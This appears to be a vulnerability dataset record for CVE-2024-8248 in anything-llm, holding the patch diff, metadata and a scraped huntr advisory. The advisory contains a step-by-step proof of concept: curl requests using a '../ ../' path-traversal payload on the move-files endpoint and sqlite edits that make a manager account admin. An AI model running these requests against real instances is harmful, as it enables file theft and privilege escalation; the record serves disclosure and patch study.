{
    "CVE-2024-8248": {
        "published_date": "2025-03-20T10:11:32.456Z",
        "patch_commits": [
            {
                "url": "https://github.com/mintplex-labs/anything-llm/commit/47a5c7126c20e2277ee56e2c7ee11990886a40a7",
                "content": "Patch path traversal in move-files that can be used by `administrator` level attacker only\n\nFilename: frontend/src/components/WorkspaceChat/ChatContainer/ChatHistory/HistoricalMessage/index.jsx:\n```\n@@ -98,7 +98,7 @@\nconst HistoricalMessage = ({\n               saveChanges={saveEditedMessage}\n             />\n           ) : (\n-            <div className={'overflow-x-scroll break-words'}>\n+            <div className={\"overflow-x-scroll break-words\"}>\n               <span\n                 className={`flex flex-col gap-y-1`}\n                 dangerouslySetInnerHTML={{\n```\n\nFilename: package.json:\n```\n@@ -10,7 +10,7 @@\n\"node\": \">=18\"\n   },\n   \"scripts\": {\n-    \"lint\": \"cd server && yarn lint && cd ../frontend && yarn lint && cd ../embed && yarn lint && cd ../collector && yarn lint\",\n+    \"lint\": \"cd server && yarn lint && cd ../frontend && yarn lint && cd ../collector && yarn lint\",\n     \"setup\": \"cd server && yarn && cd ../collector && yarn && cd ../frontend && yarn && cd .. && yarn setup:envs && yarn prisma:setup && echo \\\"Please run yarn dev:server, yarn dev:collector, and yarn dev:frontend in separate terminal tabs.\\\"\",\n     \"setup:envs\": \"cp -n ./frontend/.env.example ./frontend/.env && cp -n ./server/.env.example ./server/.env.development && cp -n ./collector/.env.example ./collector/.env && cp -n ./docker/.env.example ./docker/.env && echo \\\"All ENV files copied!\\n\\\"\",\n     \"dev:server\": \"cd server && yarn dev\",\n```\n\nFilename: server/endpoints/api/document/index.js:\n```\n@@ -686,6 +686,12 @@\nfunction apiDocumentEndpoints(app) {\n           const sourcePath = path.join(documentsPath, normalizePath(from));\n           const destinationPath = path.join(documentsPath, normalizePath(to));\n           return new Promise((resolve, reject) => {\n+            if (\n+              !isWithin(documentsPath, sourcePath) ||\n+              !isWithin(documentsPath, destinationPath)\n+            )\n+              return reject(\"Invalid file location\");\n+\n             fs.rename(sourcePath, destinationPath, (err) => {\n               if (err) {\n                 console.error(`Error moving file ${from} to ${to}:`, err);\n```\n\nFilename: server/endpoints/document.js:\n```\n@@ -60,6 +60,12 @@\nfunction documentEndpoints(app) {\n           const destinationPath = path.join(documentsPath, normalizePath(to));\n \n           return new Promise((resolve, reject) => {\n+            if (\n+              !isWithin(documentsPath, sourcePath) ||\n+              !isWithin(documentsPath, destinationPath)\n+            )\n+              return reject(\"Invalid file location\");\n+\n             fs.rename(sourcePath, destinationPath, (err) => {\n               if (err) {\n                 console.error(`Error moving file ${from} to ${to}:`, err);\n```\n\nFilename: server/models/browserExtensionApiKey.js:\n```\n@@ -88,9 +88,9 @@\nconst BrowserExtensionApiKey = {\n \n   /**\n    * Gets browser keys by params\n-   * @param {object} clause \n-   * @param {number|null} limit \n-   * @param {object|null} orderBy \n+   * @param {object} clause\n+   * @param {number|null} limit\n+   * @param {object|null} orderBy\n    * @returns {Promise<import(\"@prisma/client\").browser_extension_api_keys[]>}\n    */\n   where: async function (clause = {}, limit = null, orderBy = null) {\n\n@@ -111,9 +111,9 @@\nconst BrowserExtensionApiKey = {\n   /**\n    * Get browser API keys for user\n    * @param {import(\"@prisma/client\").users} user\n-   * @param {object} clause \n-   * @param {number|null} limit \n-   * @param {object|null} orderBy \n+   * @param {object} clause\n+   * @param {number|null} limit\n+   * @param {object|null} orderBy\n    * @returns {Promise<import(\"@prisma/client\").browser_extension_api_keys[]>}\n    */\n   whereWithUser: async function (\n```"
            }
        ],
        "sw_version": "v1.2.1",
        "sw_version_wget": "https://github.com/mintplex-labs/anything-llm/archive/refs/tags/v1.2.1.zip",
        "description": "A vulnerability in the normalizePath function in mintplex-labs/anything-llm version git 296f041 allows for path traversal, leading to arbitrary file read and write in the storage directory. This can result in privilege escalation from manager to admin. The issue is fixed in version 1.2.2.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/7d6c3b7a-1116-450d-b539-9c911a97537e",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nPath traversal lead to arbitrary file write/read in storage dir, further lead to privilege escalation from manager to admin in mintplex-labs/anything-llm\nDuplicate\nReported on Jul 29th 2024\nDescription\nfunction normalizePath is flawed, some malicious file path input is not correctly filtered, lead to arbitrary file read write in storage dir, further lead to privilege escalation from manager to admin.\nThe implementation of the normalizePath is something like this:\nfunction normalizePath(filepath = \"\") {\n  const result = path\n    .normalize(filepath.trim())\n    .replace(/^(\\.\\.(\\/|\\\\|$))+/, \"\")\n    .trim();\n  if ([\"..\", \".\", \"/\"].includes(result)) throw new Error(\"Invalid path.\");\n  return result;\n}\nNotice the second trim. If attacker provide something like \"../ ../1.txt\", after regexp replace it will be \" ../1.txt\" with a space on the front, after the second trim it will be '../1.txt', which cause path traversal\nProof of Concept\nThe server is normally setup and put in multi-user mode. I add two account, admin for with highest privilege and manager for lower privilege. We use manager privilege to demonstrate the vulnerability. We try to read the anythingllm.db(which contains the user privilege information) in storage dir, modify it and write it back. Then we will get the admin privilege. In this way both file read and write are demonstrated.\nI am sorry that the POC is kind of verbose (AFAIK there is no simpler way), but the idea is simple: try to read modify and write the database file.\n0. upload a profile picture for further use(in step 6). any file content is OK.\ntouch /tmp/1.png\ncurl -X POST \"http://localhost:3001/api/system/upload-pfp\" \\\n  -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" \\\n  -F \"file=@/tmp/1.png;filename=1.png;\"\n1. move anythingllm.db to the logo folder\ncurl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" http://localhost:3001/api/system/remove-logo\ncurl -X POST -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" -H \"Content-Type: application/json\" -d '{\"files\":[{\"from\":\"../ ../anythingllm.db\",\"to\":\"../ ../assets/anything-llm.png\"}]}' http://localhost:3001/api/document/move-files\nhave to remove logo first, the make sure that the logo file name is default one.\n2. download anythingllm.db\ncurl http://localhost:3001/api/system/logo --output anythingllm.db\nbecause the database is already moved away, the code will always try to get logo file from storage/asset/anythingllm.png, which is the path that we move the db file to, on step 1.\n3. move back anythingllm.db so that the server can works properly.\ncurl -X POST -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" -H \"Content-Type: application/json\" -d '{\"files\":[{\"to\":\"../ ../anythingllm.db\",\"from\":\"../ ../assets/anything-llm.png\"}]}' http://localhost:3001/api/document/move-files\notherwise there is no database at all, the server will not works correctly.\n4. modify the downloaded database file. (fill in the username to be the account that you want to give admin access to). Also, get the profile picture path of our account, for further use(step 6).\nsqlite3 ./anythingllm.db\nupdate users set role='admin' where username='manager';\nselect * from users where username='manager';\nThe profile picture path is something like 002bdd72-1139-4762-9e28-d2cd95f7d7a8.png 5. upload anythingllm.db\ncurl -X POST \"http://localhost:3001/api/system/upload-logo\" \\\n  -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" \\\n  -F \"logo=@anythingllm.db;filename=db.txt;\"\nwe upload the modified db as logo file, it will be stored in something like \"storage/assets/c29dc981-7b82-4c95-9d50-1dac83502adb.png\" a random location, the detail path of it is stored in database and not revealed to us. We have to download the db file again, the get the logo path, for further exploit.\n6. download anythingllm.db again, to acquire the uploaded db file path. we can not use the same method from step 1 -3 again, because we upload a logo, the logo path is not anything-llm.png anymore. We use the other channel for downloading: the Profile picture. The path of it revealed in step 4.\ncurl -X POST -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" -H \"Content-Type: application/json\" -d '{\"files\":[{\"from\":\"../ ../anythingllm.db\",\"to\":\"../ ../assets/pfp/002bdd72-1139-4762-9e28-d2cd95f7d7a8.png\"}]}' http://localhost:3001/api/document/move-files\nthe 2 in the url is the user id , which can also be get from the previous sqlite db.\ncurl http://localhost:3001/api/system/pfp/2 -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" --output anythingllm.db\n\ncurl -X POST -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" -H \"Content-Type: application/json\" -d '{\"files\":[{\"to\":\"../ ../anythingllm.db\",\"from\":\"../ ../assets/pfp/002bdd72-1139-4762-9e28-d2cd95f7d7a8.png\"}]}' http://localhost:3001/api/document/move-files\n7. get the logo filename\nsqlite3 ./anythingllm.db\nselect * from system_settings where label='logo_filename';\nIn my case, the name is f181cf47-65f7-4205-948b-4bc106097a25.txt\n8. move logo to anythingllm.db(use the file path previously )\ncurl -X POST -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtYW5hZ2VyIiwiaWF0IjoxNzIyMjIyMzE4LCJleHAiOjE3MjQ4MTQzMTh9.GR47dxBP3g4Ri_WpXYEAAWRJY_2IU1DSUqRWndiXAPg\" -H \"Content-Type: application/json\" -d '{\"files\":[{\"to\":\"../ ../anythingllm.db\",\"from\":\"../ ../assets/f181cf47-65f7-4205-948b-4bc106097a25.txt\"}]}' http://localhost:3001/api/document/move-files\nNow, we successfully overwrite the db file. The new db will take effect after when server restart.\nImpact\nThe direct impact is that arbitrary file read/write/deletion in storage folder. Database files that contain configuration, model files, vector db etc. are all put under this folder. This may lead to privilege escalation(as shown above) and DOS(due to arbitrary file deletion.)\nWe are processing your report and will contact themintplex-labs/anything-llm team within 24 hours.10 months ago\nA GitHub Issue asking the maintainers to create a SECURITY.md exists10 months ago\nWe have contacted a member of themintplex-labs/anything-llm team and are waiting to hear back10 months ago\nWe have sent a follow up to the mintplex-labs/anything-llm team. We will try again in 4 days.9 months ago\nWe have sent a second follow up to the mintplex-labs/anything-llm team. We will try again in 7 days.9 months ago\nWe have sent a third follow up to the mintplex-labs/anything-llm team. We will try again in 14 days.9 months ago\nTimothy Carambat validated this vulnerability9 months ago\nProvided a user has a administrator role on a system it is possible for the attacked to use a patch traversal mechanism to exfiltrate data from the instance via the move-files endpoint by leveraging the logo for the system as well after setting and un-setting the data in this field.\noicu0619has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-8248assigned to this report.9 months ago\nTimothy Carambat gave praise9 months ago\nGreate find + write up!\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nTimothy Carambatmarked this as fixedin 1.2.2with commit47a5c79 months ago\nTimothy Carambathas been awarded the fix bounty\nWe have notified the mintplex-labs/anything-llm maintainers about this report in their weekly follow-up7 months ago\nWe have sent a warning to the mintplex-labs/anything-llm team to inform them that this report will be published in 48 hours7 months ago\nThis vulnerability has now been published7 months ago\nEthan Silvashas marked this vulnerability as a duplicate of ad11cecf-161a-4fb1-986f-6f88272cbb9e7 months ago\nThis is a duplicate of another report that we mistakenly marked a duplicate. This report was then mistakenly reported as valid. Resetting this as a duplicate.\nThe disclosure bounty has been dropped\nThe fix bounty has been dropped\nThe researcher's credibility has increased: +7\nCVE-2024-8248has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-8248\n(Published)\nVulnerability Type\nCWE-29: Path Traversal: '\\..\\filename'\nSeverity\nHigh (7.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nNpm\nAffected Version\ngit 296f041\nVisibility\nPublic\nStatus\nDuplicate\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory lists specific technical details and describes a step-by-step explanation of the process to exploit the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-29",
                "value": "CWE-29 Path Traversal: '\\..\\filename'"
            }
        ]
    }
}